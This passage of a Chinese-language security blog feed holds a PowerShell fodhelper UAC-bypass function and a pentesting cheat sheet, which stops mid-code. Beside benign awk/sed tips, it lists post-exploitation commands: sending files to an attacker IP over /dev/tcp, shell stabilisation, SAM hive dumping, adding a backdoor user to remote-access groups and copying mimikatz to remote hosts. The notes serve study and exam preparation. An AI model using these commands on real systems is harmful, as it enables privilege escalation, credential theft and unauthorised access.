</span><br><span class="hljs-comment">#&gt;</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FodhelperBypass</span><span class="hljs-params">()</span></span><br>&#123; <br>    <span class="hljs-keyword">Param</span> (          <br>        [<span class="hljs-built_in">String</span>]<span class="hljs-variable">$program</span> = <span class="hljs-string">&quot;cmd /c start powershell.exe&quot;</span> <span class="hljs-comment">#default</span><br>    )<br><br>    <span class="hljs-comment">#Create registry structure</span><br>    <span class="hljs-built_in">New-Item</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Force</span><br>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DelegateExecute&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-literal">-Force</span><br>    <span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\Shell\Open\command&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;(default)&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-variable">$program</span> <span class="hljs-literal">-Force</span><br><br>    <span class="hljs-comment">#Perform the bypass</span><br>    <span class="hljs-built_in">Start-Process</span> <span class="hljs-string">&quot;C:\Windows\System32\fodhelper.exe&quot;</span> <span class="hljs-literal">-WindowStyle</span> <span class="hljs-keyword">Hidden</span><br><br>    <span class="hljs-comment">#Remove registry structure</span><br>    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-number">3</span><br>    <span class="hljs-built_in">Remove-Item</span> <span class="hljs-string">&quot;HKCU:\Software\Classes\ms-settings\&quot;</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br><br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BypassUAC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tools &amp;&amp; Command</title>
    <link href="/2020/11/06/13_10_tools_cmd_note/"/>
    <url>/2020/11/06/13_10_tools_cmd_note/</url>
    
    <content type="html"><![CDATA[<p>一些常用的工具和命令</p><a id="more"></a><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ul><li>Base<ul><li><code>:</code> split</li><li>Python3 Creation of virtual environments</li><li>OpenVPN</li><li>Json validate and pretty-print(Python module)</li><li>Json validate and pretty-print(jq command)</li><li>rlwrap</li><li>stty</li><li>Multiple lines to one line</li><li>rdesktop</li><li>wget https</li><li>nc prot scan</li><li>Quick file transfer</li></ul></li><li>awk</li><li>sed</li><li>mount</li></ul><br/><p><code>:</code> split</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cut -d <span class="hljs-string">&quot;:&quot;</span> -f 1<br></code></pre></div></td></tr></table></figure><p>Python3 Creation of virtual environments</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 -m venv $(<span class="hljs-built_in">pwd</span>)<br><span class="hljs-built_in">source</span> bin/activate<br><br><span class="hljs-comment"># exit</span><br>deactivate<br></code></pre></div></td></tr></table></figure><p>OpenVPN</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo openvpn --config OSCP-00000.ovpn --daemon<br></code></pre></div></td></tr></table></figure><p>Json validate and pretty-print</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python -m json.tool out.json <br><br>cat out.json | python -m json.tool<br></code></pre></div></td></tr></table></figure><p>jq JSON validate and pretty-print</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># ffuf ... -o output.json</span><br>cat output.json | jq <span class="hljs-string">&#x27;.results[0].url&#x27;</span><br></code></pre></div></td></tr></table></figure><p>rlwrap</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rlwrap nc -lvnp 9999<br></code></pre></div></td></tr></table></figure><p>stty</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># reverse shell tab 补全（体验更好的 reverse shell）</span><br><br><span class="hljs-comment"># 受控机器</span><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br><span class="hljs-comment"># ^Z / Ctrl + z 切入后台</span><br>stty raw -<span class="hljs-built_in">echo</span><br><br><span class="hljs-comment"># 返回受控机器（fg 是看不见的）</span><br><span class="hljs-built_in">fg</span><br><br><span class="hljs-comment"># 按两次回车</span><br><span class="hljs-comment"># 设置受控机器 env</span><br><span class="hljs-built_in">export</span> TERM=xterm256-color<br></code></pre></div></td></tr></table></figure><p>Multiple lines to one line</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 多行转一行</span><br>cat sqlserver.hash | xargs | sed -e <span class="hljs-string">&#x27;s/ //g&#x27;</span><br></code></pre></div></td></tr></table></figure><p>rdesktop</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rdesktop -u carol -p xxxxxxx 127.0.0.1 -r clipboard:CLIPBOARD -g 3584x2240@200<br></code></pre></div></td></tr></table></figure><p>wget https</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">wget --no-check-certificate https://www.exploit-db.com/download/28806 -O 28806.zip<br></code></pre></div></td></tr></table></figure><p>Nc Port Scan</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nc -zvn -w 1 10.3.3.14 20-1000 2&gt;&amp;1 | tee port.txt<br></code></pre></div></td></tr></table></figure><p>Quick file transfer</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># Attack </span><br>nc -lvnp 4444 &gt; file<br><br><span class="hljs-comment"># Victim</span><br>cat file &gt; /dev/tcp/10.10.11.11/4444<br></code></pre></div></td></tr></table></figure><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">cat wordlists | awk <span class="hljs-string">&#x27;length($1) &gt; 4&#x27;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;&#123;for(i=1;i&lt;=NF;i++)&#123;print $i&#125;&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;user:name&quot;</span> | awk -F: <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span><br></code></pre></div></td></tr></table></figure><h3 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">head -4 useProt.txt <br><span class="hljs-comment">#    1 10000/tcp</span><br><span class="hljs-comment">#    1 10243/tcp</span><br><span class="hljs-comment">#    1 1026/tcp</span><br><span class="hljs-comment">#    1 1028/tcp</span><br><br>cat Prot.txt | awk <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span> | sort -un | xargs | sed -e <span class="hljs-string">&#x27;s/\/tcp//g&#x27;</span> | sed -e <span class="hljs-string">&#x27;s/ /, /g&#x27;</span><br><br><span class="hljs-comment"># 21, 22, 25, 53, 80, 88, 110, 111, 113, 119, 135, 139, 143 </span><br></code></pre></div></td></tr></table></figure><p>删除 evil开头的那一行</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sed -i <span class="hljs-string">&quot;/^evil/d&quot;</span> /etc/passwd<br></code></pre></div></td></tr></table></figure><p>不显示 evil开头的那一行(原文件不变)</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sed -e <span class="hljs-string">&quot;/^evil/d&quot;</span> /etc/passwd<br></code></pre></div></td></tr></table></figure><p>替换包含 evil字符串的行(注意 /c)</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sed -i <span class="hljs-string">&#x27;/evil/cevil:xxxx&#x27;</span> pass<br><br><span class="hljs-comment"># r : xxxx:evil</span><br><span class="hljs-comment"># n : evil:xxxx</span><br></code></pre></div></td></tr></table></figure><h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mount -t cifs -o user=luke //10.11.x.x/share /mnt/&lt;local_folder&gt;<br>mount -t cifs //10.11.x.x/<span class="hljs-string">&#x27;Bob Share&#x27;</span> /mnt/smb -o rw,vers=1.0,dir_mode=0777,file_mode=0666,nounix<br></code></pre></div></td></tr></table></figure><br/><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul><li>Base<ul><li>PATH List</li><li>Split string with</li><li>Set Windows PATH For The Current Session</li><li>rundll32</li><li>cmdkey list</li><li>service start/stop</li><li>whoami</li><li>Add users to the group</li><li>look at the domain’s account policy(Low and Slow Password Guessing)</li><li>delete file/folder</li><li>findstr color</li><li>where</li><li>setspn</li><li>tasklist</li><li>firewall</li><li>runas</li><li>Extracting the SAM database</li></ul></li><li>Powershell<ul><li>Powershell Like Grep</li><li>Powershell ExecutionPolicy</li><li>Run command in backgroud</li><li>Target architecture</li><li>Copy to a remote computer</li><li>Remote to local computer</li><li>like <code>find . / ls -al</code></li><li>PSCredential plain-text passwd</li><li>New-PSDrive Remote Computer</li><li>Port Scan</li><li>Find Keyword</li><li>Disable/Enable Windows Defender</li></ul></li></ul><br/><p>PATH List</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">echo</span> %PATH:;=&amp;<span class="hljs-built_in">echo</span>.%<br><br><span class="hljs-comment"># powershell</span><br><span class="hljs-variable">$env:PATH</span><br></code></pre></div></td></tr></table></figure><p>Split string with</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$p</span>=<span class="hljs-variable">$env:PATH</span><br><span class="hljs-variable">$p</span>.Split(<span class="hljs-string">&quot;;&quot;</span>)<br><br><span class="hljs-comment"># %SystemRoot%\system32\WindowsPowerShell\v1.0\</span><br><span class="hljs-comment"># C:\Windows\system32</span><br><span class="hljs-comment"># C:\Windows</span><br><span class="hljs-comment"># C:\Windows\System32\Wbem</span><br><span class="hljs-comment"># C:\Windows\System32\WindowsPowerShell\v1.0\</span><br></code></pre></div></td></tr></table></figure><p>Set Windows PATH For The Current Session</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">set</span> PATH=<span class="hljs-string">&quot;%PATH%;C:\path\to\directory\&quot;</span><br><br><span class="hljs-comment"># powershell</span><br><span class="hljs-variable">$env:PATH</span> += <span class="hljs-string">&quot;C:\Users\0x20C\Desktop\Pentest\Sigcheck\&quot;</span><br><br><span class="hljs-comment"># if Windows 7</span><br><span class="hljs-variable">$env:PATH</span> += <span class="hljs-string">&quot;;C:\Users\0x20C\Desktop\Pentest\Sigcheck\&quot;</span><br></code></pre></div></td></tr></table></figure><p>rundll32</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># dll, function name, arguments</span><br>rundll32.exe open_cmd_dll.dll,InvokeCmd<br></code></pre></div></td></tr></table></figure><p>cmdkey list</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">cmdkey /list<br></code></pre></div></td></tr></table></figure><p>service start/stop</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">net stop service &amp;&amp; net <span class="hljs-built_in">start</span> service<br></code></pre></div></td></tr></table></figure><p>whoami</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">whoami /groups<br><br>whoami /priv<br></code></pre></div></td></tr></table></figure><p>Add users to the group</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">net localgroup <span class="hljs-string">&quot;Remote Desktop users&quot;</span> evil /add<br>net localgroup  <span class="hljs-string">&quot;Debugger Users&quot;</span> evil /add<br><br><span class="hljs-comment"># winrm (evil-winrm)</span><br>net localgroup <span class="hljs-string">&quot;Remote Management Users&quot;</span> evil /add<br></code></pre></div></td></tr></table></figure><p>look at the domain’s account policy</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># Lockout threshold(锁定阈值)</span><br><span class="hljs-comment"># Lockout observation window (minutes)(锁定观察窗口)</span><br>net accounts<br><br><span class="hljs-comment"># Low and Slow Password Guessing</span><br><span class="hljs-comment"># Spray-Passwords.ps1</span><br></code></pre></div></td></tr></table></figure><p>delete file/folder</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">del</span> re.exe<br><span class="hljs-built_in">rd</span> /s /q C:\tools<br><br><span class="hljs-built_in">rd</span> folder<br></code></pre></div></td></tr></table></figure><p>findstr color</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">findstr /n /i /a:<span class="hljs-number">6</span> /s <span class="hljs-string">&quot;Password&quot;</span> config.xml<br></code></pre></div></td></tr></table></figure><p>where</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">where</span> /<span class="hljs-built_in">r</span> C:\windows eventvwr.exe<br><span class="hljs-comment"># C:\Windows\System32\eventvwr.exe</span><br><span class="hljs-comment"># C:\Windows\SysWOW64\eventvwr.exe</span><br></code></pre></div></td></tr></table></figure><p>setspn</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">setspn <span class="hljs-literal">-T</span> <span class="hljs-built_in">SV</span><span class="hljs-literal">-DC01</span> <span class="hljs-literal">-Q</span> */*<br></code></pre></div></td></tr></table></figure><p>tasklist</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">tasklist<br>taskkill /PID <span class="hljs-number">1864</span> /F<br>taskkill /im:shell.exe /f<br></code></pre></div></td></tr></table></figure><p>firewall</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">netsh firewall show state<br><span class="hljs-comment"># Port</span><br>netsh firewall show portopening<br>netsh firewall show currentprofile<br>netsh firewall show config<br></code></pre></div></td></tr></table></figure><p>runas</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">cmdkey /add:domain /user:USER /pass:PASS<br>cmdkey /delete:Domain:interactive=BETHANY\alice<br><br>runas /savecred /user:alias cmd.exe<br></code></pre></div></td></tr></table></figure><p>Extracting the SAM database</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">reg save hklm\sam C:\SAM<br>reg save hklm\system C:\SYSTEM<br>reg save hklm\security C:\SECURITY<br></code></pre></div></td></tr></table></figure><br/><h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p>Powershell like grep</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Pattern</span> <span class="hljs-string">&quot;requestedExecutionLevel&quot;</span> <span class="hljs-literal">-Context</span> <span class="hljs-number">0</span>,<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><p>Powershell ExecutionPolicy</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-Nop</span> <span class="hljs-literal">-ExecutionPolicy</span> Bypass <span class="hljs-operator">-File</span> C:\Windows\System32\spool\drivers\color\ps.ps1<br>powershell.exe <span class="hljs-literal">-Nop</span> <span class="hljs-literal">-ep</span> Bypass <span class="hljs-operator">-File</span> C:\Windows\System32\spool\drivers\color\ps.ps1<br></code></pre></div></td></tr></table></figure><p>Run command in backgroud</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment"># cmd</span><br><span class="hljs-built_in">start</span> /b powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-enc</span> SQBFA...<br><br><span class="hljs-comment"># powershell</span><br><span class="hljs-comment"># Invoke-Command -AsJob</span><br><span class="hljs-built_in">Invoke-Command</span> <span class="hljs-literal">-AsJob</span> <span class="hljs-literal">-ComputerName</span> XOR<span class="hljs-literal">-APP23</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$crel</span> <span class="hljs-literal">-ScriptBlock</span> &#123; powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-enc</span> SQB... &#125;<br><br><span class="hljs-comment"># Jobs list</span><br><span class="hljs-built_in">Get-Job</span><br></code></pre></div></td></tr></table></figure><p>Target architecture</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$ENV:PROCESSOR_ARCHITECTURE</span><br><br>[<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Size<br><span class="hljs-comment"># 4 =&gt; 32bit</span><br><span class="hljs-comment"># 8 =&gt; 64bit</span><br></code></pre></div></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$session</span> = <span class="hljs-built_in">New-PSSession</span> <span class="hljs-literal">-ComputerName</span> XOR<span class="hljs-literal">-APP23</span> <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$crel</span><br><br><span class="hljs-built_in">Get-PSSession</span><br></code></pre></div></td></tr></table></figure><p>Copy to a remote computer</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Copy-Item</span> <span class="hljs-string">&quot;C:\files\mimikatz.exe&quot;</span> <span class="hljs-literal">-Destination</span> <span class="hljs-string">&quot;C:\Users\Public\Documents\&quot;</span> <span class="hljs-literal">-ToSession</span> <span class="hljs-variable">$session</span> <span class="hljs-literal">-Recurse</span><br></code></pre></div></td></tr></table></figure><p>Remote to local computer</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Copy-Item</span> <span class="hljs-string">&quot;C:\Users\ik.ps1&quot;</span> <span class="hljs-literal">-Destination</span> <span class="hljs-string">&quot;C:\Documents\&quot;</span> <span class="hljs-literal">-FromSession</span> <span class="hljs-variable">$session</span> <span class="hljs-literal">-Recurse</span><br></code></pre></div></td></tr></table></figure><p>like find . / ls -al</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Path</span> . <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span><br></code></pre></div></td></tr></table></figure><p>PSCredential plain-text passwd</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;MySecretPassword&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><span class="hljs-variable">$credential</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential (<span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-variable">$password</span>)<br><br><span class="hljs-comment"># Get plain-text passwd</span><br><span class="hljs-variable">$credential</span>.GetNetworkCredential()<br><span class="hljs-variable">$credential</span>.GetNetworkCredential().Password<br></code></pre></div></td></tr></table></figure><p>New-PSDrive Remote Computer</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">smbserver.py <span class="hljs-literal">-smb2support</span> <span class="hljs-literal">-username</span> admin <span class="hljs-literal">-password</span> <span class="hljs-number">123456</span> shareme <span class="hljs-variable">$</span>(<span class="hljs-built_in">pwd</span>)<br><span class="hljs-comment"># null passwd</span><br><span class="hljs-built_in">New-PSDrive</span> <span class="hljs-literal">-Name</span> evil <span class="hljs-literal">-PSProvider</span> FileSystem <span class="hljs-literal">-Root</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">119.167</span>\shareme<br><br><span class="hljs-comment"># Use Passwd</span><br><span class="hljs-variable">$sp</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-variable">$cred</span> = <span class="hljs-built_in">New-PSDrive</span> <span class="hljs-literal">-Name</span> evil <span class="hljs-literal">-PSProvider</span> FileSystem <span class="hljs-literal">-Root</span> \\<span class="hljs-number">192</span>.IP\shareme                                           <br><span class="hljs-built_in">New-PSDrive</span> <span class="hljs-literal">-Name</span> evil <span class="hljs-literal">-PSProvider</span> FileSystem <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$cred</span> <span class="hljs-literal">-Root</span> \\<span class="hljs-number">192</span>.IP\shareme<br><br><span class="hljs-built_in">Remove-PSDrive</span> <span class="hljs-literal">-Name</span> evil<br><br><span class="hljs-built_in">Get-PSDrive</span><br></code></pre></div></td></tr></table></figure><p>Port Scan</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-variable">$ports</span> = <span class="hljs-string">&quot;21 22 25 53 80 111 139 443 445 3306 3389 8000 8080&quot;</span><br><span class="hljs-variable">$ip</span>    = <span class="hljs-string">&quot;192.168.0.100&quot;</span><br><span class="hljs-variable">$ports</span>.split(<span class="hljs-string">&quot; &quot;</span>) | % &#123;<span 